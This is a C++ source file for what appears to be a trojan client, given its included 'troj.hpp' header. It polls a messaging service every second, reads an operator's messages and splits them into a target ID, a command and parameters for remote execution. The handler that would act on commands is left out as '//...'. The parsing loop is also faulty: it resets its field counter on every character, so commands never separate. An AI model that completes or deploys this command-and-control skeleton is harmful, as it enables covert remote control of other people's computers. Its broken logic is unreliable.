#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <time.h>
#include "troj.hpp"
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>

using namespace std;
using json = nlohmann::json;

constexpr int REFRESH = 1; //in seconds

int main() {

	fstream file;
	file.open("ID.id");
	file >> ID;
	file.close();

	if (ID.empty()) ID = "X";

	while (true) {
		Sleep(REFRESH * 1000);
		json message = GetLastMessage();
		
		int last;
		file.open("last", ios::in);
		file >> last;
		file.close();

		if (last == message["message_id"]) continue;
		if (time(nullptr) - message["date"] > 3) continue;

		last = message["message_id"].get<int>();
		file.open("last", ios::out);
		file << last;
		file.close();

		
		string id="", command="" ,parameters="";
		string parse = message["text"];
		for (int i = 0; i < parse.size(); i++)
		{
			int it = 1;
			if (parse[i] == ' ') {
				it++; continue;
			}

			if (it == 1)id += parse[i];
			if (it == 2)command += parse[i];
			if (it > 2)parameters += parse[i];


		}
		if (id.empty() || command.empty()) continue;
		
		if (ID == id) {
			//...
		}
	}
}
